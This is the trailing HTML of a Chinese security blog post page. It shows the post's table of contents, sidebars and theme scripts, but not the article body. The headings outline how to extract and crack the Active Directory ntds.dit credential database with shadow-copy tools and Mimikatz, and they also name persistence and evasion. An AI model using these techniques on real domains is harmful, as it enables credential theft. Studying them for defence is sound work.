href="#TGS%E4%B8%BAClient%E5%93%8D%E5%BA%94%E6%9C%8D%E5%8A%A1%E6%8E%88%E6%9D%83%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.7.2.</span> <span class="toc-text">TGS为Client响应服务授权票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%91%E9%80%81%E6%9C%8D%E5%8A%A1%E8%AF%B7%E6%B1%82"><span class="toc-number">1.8.</span> <span class="toc-text">发送服务请求</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Client%E5%90%91Service-Server%E5%8F%91%E9%80%81%E6%9C%8D%E5%8A%A1%E8%AF%B7%E6%B1%82"><span class="toc-number">1.8.1.</span> <span class="toc-text">Client向Service Server发送服务请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Service-Server%E5%93%8D%E5%BA%94Client"><span class="toc-number">1.8.2.</span> <span class="toc-text">Service Server响应Client</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.</span> <span class="toc-text">活动目录数据库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Volume-Shadow-Copy"><span class="toc-number">3.</span> <span class="toc-text">Volume Shadow Copy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ntdsutil"><span class="toc-number">4.</span> <span class="toc-text">Ntdsutil</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92%E5%BC%8F"><span class="toc-number">4.1.</span> <span class="toc-text">交互式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E4%BA%A4%E4%BA%92"><span class="toc-number">4.2.</span> <span class="toc-text">非交互</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%BF%AB%E7%85%A7"><span class="toc-number">4.2.1.</span> <span class="toc-text">查询当前系统的快照</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%BF%AB%E7%85%A7"><span class="toc-number">4.2.2.</span> <span class="toc-text">创建快照</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD%E5%BF%AB%E7%85%A7"><span class="toc-number">4.2.3.</span> <span class="toc-text">挂载快照</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E5%88%B6ntds-dit"><span class="toc-number">4.2.4.</span> <span class="toc-text">复制ntds.dit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B8%E8%BD%BD%E5%BF%AB%E7%85%A7"><span class="toc-number">4.2.5.</span> <span class="toc-text">卸载快照</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E5%BF%AB%E7%85%A7"><span class="toc-number">4.2.6.</span> <span class="toc-text">删除快照</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vssadmin"><span class="toc-number">5.</span> <span class="toc-text">Vssadmin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%BF%AB%E7%85%A7-1"><span class="toc-number">5.1.</span> <span class="toc-text">查询当前系统的快照</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%BF%AB%E7%85%A7-1"><span class="toc-number">5.2.</span> <span class="toc-text">创建快照</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E5%BF%AB%E7%85%A7%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">5.3.</span> <span class="toc-text">访问快照中的文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E5%88%B6ntds-dit-1"><span class="toc-number">5.4.</span> <span class="toc-text">复制ntds.dit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E5%BF%AB%E7%85%A7-1"><span class="toc-number">5.5.</span> <span class="toc-text">删除快照</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vshadow"><span class="toc-number">6.</span> <span class="toc-text">Vshadow</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%BF%AB%E7%85%A7-2"><span class="toc-number">6.1.</span> <span class="toc-text">查询当前系统的快照</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%BF%AB%E7%85%A7-2"><span class="toc-number">6.2.</span> <span class="toc-text">创建快照</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E5%88%B6ntds-dit-2"><span class="toc-number">6.3.</span> <span class="toc-text">复制ntds.dit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E5%BF%AB%E7%85%A7-2"><span class="toc-number">6.4.</span> <span class="toc-text">删除快照</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8vshadow%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">6.5.</span> <span class="toc-text">利用vshadow执行命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8C%81%E4%B9%85%E5%8C%96%E5%92%8C%E8%A7%84%E9%81%BF"><span class="toc-number">6.6.</span> <span class="toc-text">自启动持久化和规避</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NinjaCopy"><span class="toc-number">7.</span> <span class="toc-text">NinjaCopy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86NTDS-DIT%E6%96%87%E4%BB%B6"><span class="toc-number">8.</span> <span class="toc-text">解密NTDS.DIT文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mimikatz%E5%9C%A8%E7%BA%BF%E7%A0%B4%E8%A7%A3"><span class="toc-number">8.1.</span> <span class="toc-text">Mimikatz在线破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E7%A0%B4%E8%A7%A3"><span class="toc-number">8.2.</span> <span class="toc-text">离线破解</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/ae44.html" title="VPS环境搭建"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VPS环境搭建"/></a><div class="content"><a class="title" href="/posts/ae44.html" title="VPS环境搭建">VPS环境搭建</a><time datetime="2023-11-09T15:29:43.000Z" title="发表于 2023-11-09 23:29:43">2023-11-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3f6d.html" title="NewStarCTF2023复盘WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202310221008068.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NewStarCTF2023复盘WP"/></a><div class="content"><a class="title" href="/posts/3f6d.html" title="NewStarCTF2023复盘WP">NewStarCTF2023复盘WP</a><time datetime="2023-11-08T16:47:44.000Z" title="发表于 2023-11-09 00:47:44">2023-11-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/62c9.html" title="NewStarCTF2023WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202310221008068.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NewStarCTF2023WP"/></a><div class="content"><a class="title" href="/posts/62c9.html" title="NewStarCTF2023WP">NewStarCTF2023WP</a><time datetime="2023-11-08T14:23:29.000Z" title="发表于 2023-11-08 22:23:29">2023-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/20b4.html" title="HTTP请求走私漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTTP请求走私漏洞"/></a><div class="content"><a class="title" href="/posts/20b4.html" title="HTTP请求走私漏洞">HTTP请求走私漏洞</a><time datetime="2023-11-07T00:00:24.000Z" title="发表于 2023-11-07 08:00:24">2023-11-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3b65.html" title="Burp联动Proxifier抓取小程序流量"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Burp联动Proxifier抓取小程序流量"/></a><div class="content"><a class="title" href="/posts/3b65.html" title="Burp联动Proxifier抓取小程序流量">Burp联动Proxifier抓取小程序流量</a><time datetime="2023-10-29T07:02:10.000Z" title="发表于 2023-10-29 15:02:10">2023-10-29</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="footer_deal"><a class="deal_link" href="mailto:975025272@qq.com" title="email"><i class="anzhiyufont anzhiyu-icon-envelope"></i></a><img class="footer_mini_logo" title="返回顶部" alt="返回顶部" onclick="anzhiyu.scrollToDest(0, 500)" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" size="50px"/><a class="deal_link" target="_blank" rel="noopener" href="https://github.com/hihopkc" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title="博客框架为Hexo_v5.4.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Frame-Hexo.svg" alt="博客框架为Hexo_v5.4.0"/></a><a class="github-badge" target="_blank" href="https://blog.anheyu.com/" style="margin-inline:5px" data-title="本站使用AnZhiYu主题" title="本站使用AnZhiYu主题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.9/img/Theme-AnZhiYu-2E67D3.svg" alt="本站使用AnZhiYu主题"/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title="本站项目由Github托管"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Source-Github.svg" alt="本站项目由Github托管"/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.2.0/img/badge/Copyright-BY-NC-SA.svg" alt="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"/></a></p></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2023 By <a class="footer-bar-link" href="/" title="hihopkc" target="_blank">hihopkc</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">87</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">26</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/ChatGpt/" style="font-size: 0.88rem;">ChatGpt<sup>2</sup></a><a href="/tags/Java/" style="font-size: 0.88rem;">Java<sup>1</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>2</sup></a><a href="/tags/MSF/" style="font-size: 0.88rem;">MSF<sup>1</sup></a><a href="/tags/Navicat/" style="font-size: 0.88rem;">Navicat<sup>1</sup></a><a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">Web安全<sup>9</sup></a><a href="/tags/binwalk/" style="font-size: 0.88rem;">binwalk<sup>1</sup></a><a href="/tags/docker/" style="font-size: 0.88rem;">docker<sup>4</sup></a><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>1</sup></a><a href="/tags/mysql/" style="font-size: 0.88rem;">mysql<sup>1</sup></a><a href="/tags/oracle/" style="font-size: 0.88rem;">oracle<sup>1</sup></a><a href="/tags/owasp/" style="font-size: 0.88rem;">owasp<sup>1</sup></a><a href="/tags/phpstudy/" style="font-size: 0.88rem;">phpstudy<sup>1</sup></a><a href="/tags/python/" style="font-size: 0.88rem;">python<sup>1</sup></a><a href="/tags/redis/" style="font-size: 0.88rem;">redis<sup>1</sup></a><a href="/tags/shiro/" style="font-size: 0.88rem;">shiro<sup>1</sup></a><a href="/tags/sql/" style="font-size: 0.88rem;">sql<sup>1</sup></a><a href="/tags/ssrf/" style="font-size: 0.88rem;">ssrf<sup>1</sup></a><a href="/tags/xss/" style="font-size: 0.88rem;">xss<sup>2</sup></a><a href="/tags/%E5%AE%B9%E5%99%A8/" style="font-size: 0.88rem;">容器<sup>1</sup></a><a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 0.88rem;">护网<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 0.88rem;">数据库<sup>2</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">测试工具<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.0.8/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.cbd.int/pangu@4.0.7/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("02/18/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2023 By 安知鱼 V1.6.9",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hihopkc 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.56.5/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://hihopkc.space/',
+      region: '',
+      onCommentLoaded: () => {
+        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(runFn,0)
+    else getScript('https://cdn.cbd.int/twikoo@1.6.21/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://hihopkc.space/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const runFn = () => {
+    init();
+    
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else {
+      loadTwikoo()
+    }
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getComment = () => {
+    const runTwikoo = () => {
+      twikoo.getRecentComments({
+        envId: 'https://hihopkc.space/',
+        region: '',
+        pageSize: 6,
+        includeReply: true
+      }).then(function (res) {
+        const twikooArray = res.map(e => {
